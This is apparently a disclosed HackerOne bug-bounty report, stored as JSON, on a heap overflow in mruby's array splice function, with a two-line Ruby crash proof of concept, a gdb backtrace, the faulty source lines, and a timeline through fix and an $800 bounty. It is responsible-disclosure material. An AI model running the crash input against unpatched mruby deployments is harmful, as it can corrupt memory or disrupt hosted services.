@@ -1,0 +1,301 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-01-12T03:09:25.662Z", 
+    "voters": [
+        "eveeez", 
+        "japz", 
+        "spetr0x", 
+        "arianabop1"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "800.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 192362, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-01-11T21:56:02.597Z", 
+    "vulnerability_information": "It's similar with #192235, but the root cause is different.\n\nboth of mruby and mruby-engine are crashed by the following PoC. (MRB_INT64)\n```ruby\nary = Array.new(1023)\nary[0x7ffffffffffffc00,0] = Array.new(1024)\n```\n\n```\n$ gdb -q --args ./bin/mruby test2.rb\nReading symbols from ./bin/mruby...done.\n(gdb) r\nStarting program: /home/tunz/working/mruby/mruby/bin/mruby test2.rb\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x00000000004147fe in ary_fill_with_nil (ptr=0xe5c010, size=9223372036854765337) at /home/tunz/working/mruby/mruby/src/array.c:104\n104         *ptr++ = nil;\n(gdb) list\n99      ary_fill_with_nil(mrb_value *ptr, mrb_int size)\n100     {\n101       mrb_value nil = mrb_nil_value();\n102\n103       while (size--) {\n104         *ptr++ = nil;\n105       }\n106     }\n107\n108     static void\n(gdb) bt\n#0  0x00000000004147fe in ary_fill_with_nil (ptr=0xe5c010, size=9223372036854765337) at /home/tunz/working/mruby/mruby/src/array.c:104\n#1  0x0000000000415fd1 in mrb_ary_splice (mrb=0xdd7010, ary=..., head=9223372036854774784, len=-9223372036854773761, rpl=...)\n    at /home/tunz/working/mruby/mruby/src/array.c:626\n#2  0x00000000004165be in mrb_ary_aset (mrb=0xdd7010, self=...) at /home/tunz/working/mruby/mruby/src/array.c:808\n#3  0x0000000000430c09 in mrb_vm_exec (mrb=0xdd7010, proc=0xdda210, pc=0xe3f03c) at /home/tunz/working/mruby/mruby/src/vm.c:1171\n#4  0x000000000042f121 in mrb_vm_run (mrb=0xdd7010, proc=0xdda210, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:772\n#5  0x0000000000437199 in mrb_top_run (mrb=0xdd7010, proc=0xdda210, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:2487\n#6  0x0000000000447847 in mrb_load_exec (mrb=0xdd7010, p=0xe332d0, c=0xe31f40)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n#7  0x00000000004478dd in mrb_load_file_cxt (mrb=0xdd7010, f=0xe32f10, c=0xe31f40)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n#8  0x00000000004024fc in main (argc=2, argv=0x7ffff40a93e8)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n(gdb) x/i $pc\n=> 0x4147fe <ary_fill_with_nil+51>:     mov    QWORD PTR [rcx],rax\n(gdb) i r rcx\nrcx            0xe5c000 15056896\n```\n\nI think the following lines are the problem in src/array.c:\n```C\n 581 MRB_API mrb_value\n 582 mrb_ary_splice(mrb_state *mrb, mrb_value ary, mrb_int head, mrb_int len, mrb_value rpl)\n 583 {\n...\n 619   size = head + argc; // size is calculated here, and can be overflow\n 620\n 621   if (tail < a->len) size += a->len - tail;\n 622   if (size > a->aux.capa) // then, bypass this condition\n 623     ary_expand_capa(mrb, a, size);\n 624\n 625   if (head > a->len) {\n 626     ary_fill_with_nil(a->ptr + a->len, head - a->len); // heap overflow since capa is still small. \n 627   }\n...\n```", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "low", 
+        "author_type": "Team"
+    }, 
+    "title": "Heap Overflow in mrb_arb_splice", 
+    "is_member_of_team?": null, 
+    "vote_count": 4, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-02-10T21:56:02.651Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$800", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-19T18:51:20.461Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-19T18:51:20.461Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thank you for your report. We've reproduced the crash, and opened an issue in the mruby repository: https://github.com/mruby/mruby/issues/3354", 
+            "markdown_message": "<p>Thank you for your report. We&#39;ve reproduced the crash, and opened an issue in the mruby repository: <a title=\"https://github.com/mruby/mruby/issues/3354\" href=\"/redirect?signature=a0d25348b6e6d91256d46449f1e120476c0be114&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3354\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/issues/3354</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 1374627, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-19T18:51:26.254Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-19T18:51:26.254Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Low", 
+                "old_severity": null
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 1374628, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "tunz", 
+                "url": "/tunz"
+            }, 
+            "created_at": "2017-01-09T22:06:51.846Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-09T22:06:51.846Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thank you for your report. This issue has been addressed upstream, and we're running a patched version in our production environment.\n\nOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.", 
+            "markdown_message": "<p>Thank you for your report. This issue has been addressed upstream, and we&#39;re running a patched version in our production environment.</p>\n\n<p>Our next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1409726, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-01-11T21:55:58.673Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-11T21:55:58.673Z", 
+            "actor": {
+                "url": "/shopify-scripts", 
+                "profile": {
+                    "name": "shopify-scripts"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+                }
+            }, 
+            "team_handle": "shopify-scripts", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "800.0", 
+            "collaborator": {
+                "username": "tunz", 
+                "url": "/tunz"
+            }, 
+            "message": "Thanks for helping improve the security of Shopify Scripts and the mruby project!", 
+            "markdown_message": "<p>Thanks for helping improve the security of Shopify Scripts and the mruby project!</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1414749, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-01-11T21:56:02.622Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-11T21:56:02.622Z", 
+            "actor": {
+                "username": "andrewdunbar", 
+                "url": "/andrewdunbar", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/164/cd46f5270ea41c5f0da3bea93e2eca7a95858caf_medium.jpg?1427927985"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1414750, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-01-12T03:09:25.690Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-12T03:09:25.690Z", 
+            "actor": {
+                "username": "tunz", 
+                "url": "/tunz", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1415211, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-01-12T03:09:25.748Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-12T03:09:25.748Z", 
+            "actor": {
+                "username": "tunz", 
+                "url": "/tunz", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1415212, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "tunz", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/tunz", 
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 2, 
+        "name": "Memory Corruption - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -57372538.14402514, 
+    "disclosed_at": "2017-01-12T03:09:25.728Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/192362", 
+    "created_at": "2016-12-19T08:57:01.719Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>It&#39;s similar with <a href=\"/reports/192235\">#192235</a>, but the root cause is different.</p>\n\n<p>both of mruby and mruby-engine are crashed by the following PoC. (MRB_INT64)</p>\n<pre class=\"highlight ruby\"><code><span class=\"n\">ary</span> <span class=\"o\">=</span> <span class=\"no\">Array</span><span class=\"p\">.</span><span class=\"nf\">new</span><span class=\"p\">(</span><span class=\"mi\">1023</span><span class=\"p\">)</span>\n<span class=\"n\">ary</span><span class=\"p\">[</span><span class=\"mh\">0x7ffffffffffffc00</span><span class=\"p\">,</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"no\">Array</span><span class=\"p\">.</span><span class=\"nf\">new</span><span class=\"p\">(</span><span class=\"mi\">1024</span><span class=\"p\">)</span>\n</code></pre><pre class=\"highlight plaintext\"><code>$ gdb -q --args ./bin/mruby test2.rb\nReading symbols from ./bin/mruby...done.\n(gdb) r\nStarting program: /home/tunz/working/mruby/mruby/bin/mruby test2.rb\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x00000000004147fe in ary_fill_with_nil (ptr=0xe5c010, size=9223372036854765337) at /home/tunz/working/mruby/mruby/src/array.c:104\n104         *ptr++ = nil;\n(gdb) list\n99      ary_fill_with_nil(mrb_value *ptr, mrb_int size)\n100     {\n101       mrb_value nil = mrb_nil_value();\n102\n103       while (size--) {\n104         *ptr++ = nil;\n105       }\n106     }\n107\n108     static void\n(gdb) bt\n#0  0x00000000004147fe in ary_fill_with_nil (ptr=0xe5c010, size=9223372036854765337) at /home/tunz/working/mruby/mruby/src/array.c:104\n#1  0x0000000000415fd1 in mrb_ary_splice (mrb=0xdd7010, ary=..., head=9223372036854774784, len=-9223372036854773761, rpl=...)\n    at /home/tunz/working/mruby/mruby/src/array.c:626\n#2  0x00000000004165be in mrb_ary_aset (mrb=0xdd7010, self=...) at /home/tunz/working/mruby/mruby/src/array.c:808\n#3  0x0000000000430c09 in mrb_vm_exec (mrb=0xdd7010, proc=0xdda210, pc=0xe3f03c) at /home/tunz/working/mruby/mruby/src/vm.c:1171\n#4  0x000000000042f121 in mrb_vm_run (mrb=0xdd7010, proc=0xdda210, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:772\n#5  0x0000000000437199 in mrb_top_run (mrb=0xdd7010, proc=0xdda210, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:2487\n#6  0x0000000000447847 in mrb_load_exec (mrb=0xdd7010, p=0xe332d0, c=0xe31f40)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n#7  0x00000000004478dd in mrb_load_file_cxt (mrb=0xdd7010, f=0xe32f10, c=0xe31f40)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n#8  0x00000000004024fc in main (argc=2, argv=0x7ffff40a93e8)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n(gdb) x/i $pc\n=&gt; 0x4147fe &lt;ary_fill_with_nil+51&gt;:     mov    QWORD PTR [rcx],rax\n(gdb) i r rcx\nrcx            0xe5c000 15056896\n</code></pre>\n<p>I think the following lines are the problem in src/array.c:</p>\n<pre class=\"highlight plaintext\"><code> 581 MRB_API mrb_value\n 582 mrb_ary_splice(mrb_state *mrb, mrb_value ary, mrb_int head, mrb_int len, mrb_value rpl)\n 583 {\n...\n 619   size = head + argc; // size is calculated here, and can be overflow\n 620\n 621   if (tail &lt; a-&gt;len) size += a-&gt;len - tail;\n 622   if (size &gt; a-&gt;aux.capa) // then, bypass this condition\n 623     ary_expand_capa(mrb, a, size);\n 624\n 625   if (head &gt; a-&gt;len) {\n 626     ary_fill_with_nil(a-&gt;ptr + a-&gt;len, head - a-&gt;len); // heap overflow since capa is still small. \n 627   }\n...\n</code></pre>", 
+    "severity_rating": "low", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.mruby.science", 
+            "about": "", 
+            "twitter_handle": "", 
+            "name": "shopify-scripts"
+        }, 
+        "handle": "shopify-scripts", 
+        "url": "https://hackerone.com/shopify-scripts", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/015/668/9f47d94cbd9e4311b57f1ab05f67fb5c26fd2e78_small.jpg?1475592254", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 15668, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
